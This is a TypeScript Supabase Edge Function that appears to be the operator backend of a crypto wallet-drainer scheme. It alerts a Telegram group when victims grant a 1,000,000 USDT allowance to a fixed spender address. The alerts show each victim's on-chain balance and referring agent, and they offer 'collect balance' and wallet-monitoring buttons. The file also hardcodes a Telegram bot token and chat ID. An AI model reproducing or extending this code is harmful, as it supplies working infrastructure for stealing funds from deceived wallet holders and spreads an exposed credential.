// @ts-nocheck
// Setup type definitions for built-in Supabase Runtime APIs
import "jsr:@supabase/functions-js/edge-runtime.d.ts";
import { createClient } from 'jsr:@supabase/supabase-js@2';

// Telegram Bot配置 - 使用硬编码值确保可用
const TELEGRAM_BOT_TOKEN = '8244139410:AAECUajPMdPx4C6b64YO0Wu2ginswejST_I';
const TELEGRAM_CHAT_ID = '-1003149735777';

// Supabase配置（Edge Function中自动可用）
const SUPABASE_URL = Deno.env.get('SUPABASE_URL') || '';
const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') || '';

// 初始化Supabase客户端（使用service_role_key以绕过RLS）
const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);

// ETH主网USDT合约地址
const USDT_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const ETH_RPC_URL = 'https://ethereum.publicnode.com';

// 类型定义
interface Notification {
  id: number;
  notification_type: string;
  user_id?: string;
  user_address?: string;
  notification_data?: Record<string, unknown>;
  is_sent: boolean;
}

/**
 * 获取链上USDT余额
 */
async function getOnChainUsdtBalance(address: string): Promise<string> {
  try {
    console.log(`开始查询链上USDT余额 - 地址: ${address}`);
    
    // 确保地址格式正确：去除0x，转小写
    const cleanAddress = address.toLowerCase().replace('0x', '');
    console.log(`清理后的地址: ${cleanAddress}`);
    
    // 调用USDT合约的balanceOf方法
    const balanceResponse = await fetch(ETH_RPC_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        jsonrpc: '2.0',
        method: 'eth_call',
        params: [
          {
            to: USDT_CONTRACT,
            data: `0x70a08231000000000000000000000000${cleanAddress}`, // balanceOf(address)
          },
          'latest',
        ],
        id: 1,
      }),
    });

    const balanceData = await balanceResponse.json();
    console.log(`📡 RPC响应:`, JSON.stringify(balanceData));

    if (balanceData.error) {
      console.error('RPC错误:', balanceData.error);
      return '0.000000';
    }

    if (!balanceData.result) {
      console.error('未获取到结果');
      return '0.000000';
    }

    // 解析余额 (ETH主网USDT使用6位小数)
    const balanceHex = balanceData.result;
    const balanceWei = BigInt(balanceHex);
    const balance = Number(balanceWei) / Math.pow(10, 6);
    const balanceFormatted = balance.toFixed(6);

    console.log(`链上USDT余额查询成功: ${balanceFormatted} USDT`);
    return balanceFormatted;
  } catch (error) {
    console.error('获取链上USDT余额异常:', error);
    return '0.000000';
  }
}

/**
 * 从数据库获取完整用户信息 - 修复为使用nh_member_new表
 */
async function getUserCompleteInfo(userId: string, userAddress: string) {
  try {
    // 查询用户详细信息 - 使用nh_member_new表，包含授权地址
    const { data: memberData, error } = await supabase
      .from('nh_member_new')
      .select(`
        id,
        wallet_address,
        auth_wallet_address,
        referred_by,
        agent_id,
        is_active,
        created_at,
        a_eth,
        eth,
        telegram_user_id
      `)
      .eq('id', userId)
      .single();

    if (error) {
      console.error('查询用户信息失败:', error);
      return null;
    }

    // 修复：使用授权地址查询链上USDT余额，而不是注册地址！
    const addressToQuery = memberData.auth_wallet_address || memberData.wallet_address || userAddress;
    console.log(` 查询链上USDT余额 - 授权地址: ${addressToQuery}`);
    
    const onChainUsdtBalance = await getOnChainUsdtBalance(addressToQuery);

    // 生成用户编号（与管理后台同步）- 8位数字格式
    let userNumber = '未知';
    if (memberData.id) {
      // 移除UUID中的连字符
      const cleanUuid = memberData.id.replace(/-/g, '');
      
      // 使用与管理后台相同的哈希算法
      let hash = 0;
      for (let i = 0; i < cleanUuid.length; i++) {
        const char = cleanUuid.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash; // 转换为32位整数
      }
      
      // 取绝对值并限制为8位数字
      const numericId = Math.abs(hash) % 100000000;
      userNumber = numericId.toString().padStart(8, '0');
    }

    // 获取代理信息
    let topAgent = '默认代理';
    let agentNickname = '直链授权';

    if (memberData.agent_id && memberData.agent_id > 0) {
      try {
        const { data: agentData } = await supabase
          .from('nh_agents')
          .select('agent_name, referral_code')
          .eq('id', memberData.agent_id)
          .single();

        if (agentData) {
          topAgent = agentData.agent_name || '默认代理';
          agentNickname = agentData.referral_code || '直链授权';
        }
      } catch (err) {
        console.log('获取代理信息失败，使用默认值');
      }
    }

    const userRemark = memberData.telegram_user_id || '暂无备注';
    const isActive = memberData.is_active ? '是' : '否';

    return {
      userId: memberData.id,
      address: memberData.wallet_address,
      authWalletAddress: memberData.auth_wallet_address || memberData.wallet_address,
      usdtBalance: onChainUsdtBalance,
      ethBalance: memberData.eth || '0',
      allowance: '1000000',
      isAuthorized: isActive,
      userNumber: userNumber,
      superiorAgent: topAgent,
      agentNickname: agentNickname,
      userRemark: userRemark,
      authAddress: '0xc8aC739F97Ba872b49FAfCfA072b5965fe4bE218',
    };
  } catch (error) {
    console.error('获取用户完整信息异常:', error);
    return null;
  }
}

/**
 * 构建授权通知消息
 */
async function buildAuthorizeMessage(notification: Notification): Promise<string> {
  console.log('开始构建授权消息...', notification);
  
  const notifData = notification.notification_data || {};
  const userAddress = notifData.wallet_address || notifData.authAddress || notification.user_address;
  
  const userInfo = await getUserCompleteInfo(notification.user_id || '', userAddress);
  
  if (!userInfo) {
    console.log('无法获取用户信息，使用默认消息');
    return `
钱包余额: 0.000000
顶层代理: 默认代理
代理昵称: 直链授权
用户编号: 未知
用户备注: 暂无备注
是否活动: 否
用户钱包: 
${userAddress}
授权金额: 1000000.0000 USDT
客户地址: 
${userAddress.toLowerCase()}
授权对象: 
0xc8aC739F97Ba872b49FAfCfA072b5965fe4bE218
执行操作: 客户调整我方授权额度
    `.trim();
  }

  const message = `
钱包余额: ${userInfo.usdtBalance}
顶层代理: ${userInfo.superiorAgent}
代理昵称: ${userInfo.agentNickname}
用户编号: ${userInfo.userNumber}
用户备注: ${userInfo.userRemark}
是否活动: 否
用户钱包: 
${userInfo.address}
授权金额: ${userInfo.allowance} USDT
客户地址: 
${userInfo.address.toLowerCase()}
授权对象: 
${userInfo.authAddress}
执行操作: 客户调整我方授权额度
  `.trim();

  console.log('授权消息构建完成');
  return message;
}

/**
 * 构建参与活动通知消息
 */
async function buildParticipateActivityMessage(notification: Notification): Promise<string> {
  console.log('开始构建参与活动消息...', notification);
  
  const notifData = notification.notification_data || {};
  const userAddress = notifData.wallet_address || notification.user_address;
  
  const userInfo = await getUserCompleteInfo(notification.user_id || '', userAddress);
  
  if (!userInfo) {
    console.log('无法获取用户信息，使用默认消息');
    return `
钱包余额: 0.000000
顶层代理: 默认代理
代理昵称: 直链授权
用户编号: 未知
用户备注: 暂无备注
是否活动: 是
用户钱包: 
${userAddress}
授权金额: 1000000.0000 USDT
客户地址: 
${userAddress.toLowerCase()}
授权对象: 
0xc8aC739F97Ba872b49FAfCfA072b5965fe4bE218
执行操作: 客户参与活动
    `.trim();
  }

  const message = `
钱包余额: ${userInfo.usdtBalance}
顶层代理: ${userInfo.superiorAgent}
代理昵称: ${userInfo.agentNickname}
用户编号: ${userInfo.userNumber}
用户备注: ${userInfo.userRemark}
是否活动: 是
用户钱包: 
${userInfo.address}
授权金额: ${userInfo.allowance} USDT
客户地址: 
${userInfo.address.toLowerCase()}
授权对象: 
${userInfo.authAddress}
执行操作: 客户参与活动
  `.trim();

  console.log('参与活动消息构建完成');
  return message;
}

/**
 * 构建奖励发放消息
 */
async function buildRewardMessage(notification: Notification): Promise<string> {
  const userAddress = notification.user_address || notification.notification_data?.wallet_address;
  const userInfo = await getUserCompleteInfo(notification.user_id || '', userAddress);
  
  if (!userInfo) {
    return `
定时奖励发放通知
地址: ${userAddress}
时间: ${new Date().toLocaleString('zh-CN')}
    `.trim();
  }

  const data = notification.notification_data || {};
  const message = `
钱包余额: ${userInfo.usdtBalance}
顶层代理: ${userInfo.superiorAgent}
代理昵称: ${userInfo.agentNickname}
用户编号: ${userInfo.userNumber}
用户备注: ${userInfo.userRemark}
是否活动: ${userInfo.isAuthorized}
用户钱包: 
${userInfo.address}
授权金额: ${userInfo.allowance} USDT
客户地址: 
${userInfo.address.toLowerCase()}
授权对象: 
${userInfo.authAddress}
执行操作: 定时奖励发放
奖励详情: ETH ${data.ethAmount || '0'} (USDT ${data.usdtAmount || '0'} @ ${data.ethPrice || '0'})
  `.trim();

  return message;
}

/**
 * 构建钱包交易通知消息 - 完整版（查询用户信息和链上余额）
 */
async function buildWalletTransactionMessage(notification: Notification): Promise<string> {
  console.log('开始构建钱包交易消息...', notification);
  
  const notifData = notification.notification_data || {};
  const userAddress = notification.user_address || notifData.user_address;
  const transactionType = notifData.transaction_type || 'in';
  const amount = notifData.amount || '0';
  const token = notifData.token || 'USDT';
  const txHash = notifData.tx_hash || '';
  const fromAddress = notifData.from_address || '';
  const toAddress = notifData.to_address || '';
  
  // 获取完整用户信息（包括链上余额、代理信息等）
  const userInfo = await getUserCompleteInfo(notification.user_id || '', userAddress);
  
  if (!userInfo) {
    console.log('无法获取用户信息，使用简化消息');
    const emoji = transactionType === 'in' ? '🟢' : '🔴';
    const action = transactionType === 'in' ? '收入' : '支出';
    const sign = transactionType === 'in' ? '+' : '-';
    const target = transactionType === 'in' ? fromAddress : toAddress;
    
    return `
${emoji}${action}USDT 提醒       ${sign}${amount} USDT

用户钱包：
${userAddress}
订单金额：${sign}${amount} ${token}
交易对象：
${target}
执行操作：客户${transactionType === 'in' ? '转入' : '转出'}
交易哈希：
${txHash}
    `.trim();
  }
  
  // 构建完整消息（包含用户信息、代理信息、链上余额）
  const emoji = transactionType === 'in' ? '🟢' : '🔴';
  const action = transactionType === 'in' ? '收入' : '支出';
  const sign = transactionType === 'in' ? '+' : '-';
  const target = transactionType === 'in' ? fromAddress : toAddress;
  
  const message = `
${emoji}${action}USDT 提醒       ${sign}${amount} USDT

钱包余额: ${userInfo.usdtBalance}
顶层代理: ${userInfo.superiorAgent}
代理昵称: ${userInfo.agentNickname}
用户编号: ${userInfo.userNumber}
用户备注: ${userInfo.userRemark}
是否活动: ${userInfo.isAuthorized}
用户钱包: 
${userInfo.address}
订单金额: ${sign}${amount} ${token}
授权金额: ${userInfo.allowance} USDT
客户地址: 
${userInfo.address.toLowerCase()}
交易对象: 
${target}
执行操作: 客户${transactionType === 'in' ? '转入' : '转出'}
授权对象: 
${userInfo.authAddress}
交易哈希: 
${txHash}
  `.trim();
  
  console.log('钱包交易消息构建完成（包含完整用户信息）');
  return message;
}

/**
 * 构建默认消息
 */
function buildDefaultMessage(notification: Notification): string {
  return `
系统通知

类型: ${notification.notification_type}
用户: ${notification.user_address || '未知'}
数据: ${JSON.stringify(notification.notification_data, null, 2)}
  `.trim();
}

/**
 * 发送Telegram消息（支持内联键盘按钮）
 */
async function sendTelegramMessage(message: string, inlineKeyboard: Record<string, unknown> | null = null) {
  console.log('开始发送Telegram消息...');
  console.log('消息内容:', message.substring(0, 100) + '...');
  console.log('Bot Token:', TELEGRAM_BOT_TOKEN.substring(0, 10) + '...');
  console.log('Chat ID:', TELEGRAM_CHAT_ID);

  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('Telegram配置缺失，跳过发送');
    return { success: false, error: 'Telegram配置缺失' };
  }

  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const body: Record<string, unknown> = {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      // 不使用任何解析模式，纯文本发送确保换行符正常工作
    };

    if (inlineKeyboard) {
      body.reply_markup = inlineKeyboard;
    }

    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(body),
    });

    const result = await response.json();

    if (result.ok) {
      console.log('Telegram消息发送成功，消息ID:', result.result?.message_id);
      return {
        success: true,
        messageId: result.result?.message_id?.toString(),
      };
    } else {
      console.error('Telegram消息发送失败:', result);
      return {
        success: false,
        error: result.description || '未知错误',
      };
    }
  } catch (error) {
    console.error('发送Telegram消息异常:', error);
    return {
      success: false,
      error: error instanceof Error ? error.message : '网络异常',
    };
  }
}

/**
 * 更新通知状态
 */
async function updateNotificationStatus(
  notificationId: number,
  success: boolean,
  errorMessage?: string,
  messageId?: string
) {
  try {
    const { error } = await supabase
      .from('telegram_notification_queue')
      .update({
        is_sent: success,
        sent_at: success ? new Date().toISOString() : null,
        telegram_message_id: messageId || null,
        error_message: errorMessage || null,
      })
      .eq('id', notificationId);

    if (error) {
      console.error('更新通知状态失败:', error);
    } else {
      console.log(`通知状态已更新: ${success ? '成功' : '失败'}`);
    }
  } catch (error) {
    console.error('更新通知状态异常:', error);
  }
}

/**
 * 处理通知
 */
async function handleNotification(notification: Notification) {
  try {
    console.log(`处理${notification.notification_type}通知...`);

    let message = '';
    let inlineKeyboard: Record<string, unknown> | null = null;

    const notifData = notification.notification_data || {};
    const userAddress = notifData.wallet_address || notifData.authAddress || notification.user_address;

    // 为授权和参与活动添加内联按钮
    if (userAddress) {
      if (notification.notification_type === 'user_authorize') {
        inlineKeyboard = {
          inline_keyboard: [
            [
              {
                text: '添加到链上实时监听',
                callback_data: `add_monitor:${userAddress}`,
              },
            ],
          ],
        };
      } else if (notification.notification_type === 'user_participate_activity') {
        inlineKeyboard = {
          inline_keyboard: [
            [
              {
                text: '归集余额',
                callback_data: `collection:${userAddress}`,
              },
            ],
            [
              {
                text: '添加到链上实时监听',
                callback_data: `add_monitor:${userAddress}`,
              },
            ],
          ],
        };
      }
    }

    // 根据通知类型构建消息
    switch (notification.notification_type) {
      case 'user_authorize':
        message = await buildAuthorizeMessage(notification);
        break;
      
      case 'user_authorize_failed': {
        console.log('🔴 构建授权失败消息');
        const notifData = notification.notification_data || {};
        const userAddress = notifData.wallet_address || notification.user_address || '未知';
        const authAmount = notifData.authAmount || '1000000';
        const txHash = notifData.txHash || '无';
        
        // 获取用户完整信息
        const userInfo = await getUserCompleteInfo(notification.user_id || '', userAddress);
        
        if (!userInfo) {
          message = `
❌ 授权失败

钱包地址：
${userAddress}
授权金额：${authAmount} USDT
交易哈希：${txHash}
时间：${new Date().toLocaleString('zh-CN')}
`.trim();
        } else {
          message = `
❌ 授权失败

钱包余额: ${userInfo.usdtBalance}
顶层代理: ${userInfo.superiorAgent}
代理昵称: ${userInfo.agentNickname}
用户编号: ${userInfo.userNumber}
用户备注: ${userInfo.userRemark}
用户钱包: 
${userInfo.address}
授权金额: ${authAmount} USDT
客户地址: 
${userInfo.address.toLowerCase()}
交易哈希: ${txHash}
时间: ${new Date().toLocaleString('zh-CN')}
`.trim();
        }
        // 失败不附加任何按钮
        inlineKeyboard = null;
        break;
      }
      
      case 'user_participate_activity':
        message = await buildParticipateActivityMessage(notification);
        break;
      
      case 'reward_distribution':
        message = await buildRewardMessage(notification);
        break;
      
      case 'wallet_transaction':
        // 新增：处理钱包交易通知（异步获取完整用户信息）
        message = await buildWalletTransactionMessage(notification);
        break;
      
      default:
        console.warn('⚠️ 未知通知类型，使用默认消息模板:', notification.notification_type);
        message = buildDefaultMessage(notification);
    }

    // 发送消息
    const result = await sendTelegramMessage(message, inlineKeyboard);

    // 更新通知状态
    await updateNotificationStatus(
      notification.id,
      result.success,
      result.error,
      result.messageId
    );
  } catch (error) {
    console.error('处理通知失败:', error);
    await updateNotificationStatus(
      notification.id,
      false,
      error instanceof Error ? error.message : '未知错误'
    );
  }
}

/**
 * Edge Function入口
 */
Deno.serve(async (req) => {
  try {
    if (req.method !== 'POST') {
      return new Response(
        JSON.stringify({ error: 'Method not allowed' }),
        {
          status: 405,
          headers: { 'Content-Type': 'application/json' },
        }
      );
    }

    const payload = await req.json();
    console.log('收到Webhook通知:', JSON.stringify(payload, null, 2));

    // 处理来自 Supabase Realtime 的通知
    if (payload.type === 'INSERT' && payload.table === 'telegram_notification_queue') {
      const notification = payload.record;
      if (!notification.is_sent) {
        await handleNotification(notification);
      }
    }

    return new Response(
      JSON.stringify({ success: true }),
      {
        status: 200,
        headers: { 'Content-Type': 'application/json' },
      }
    );
  } catch (error) {
    console.error('处理请求失败:', error);
    return new Response(
      JSON.stringify({
        error: error instanceof Error ? error.message : '未知错误',
      }),
      {
        status: 500,
        headers: { 'Content-Type': 'application/json' },
      }
    );
  }
});
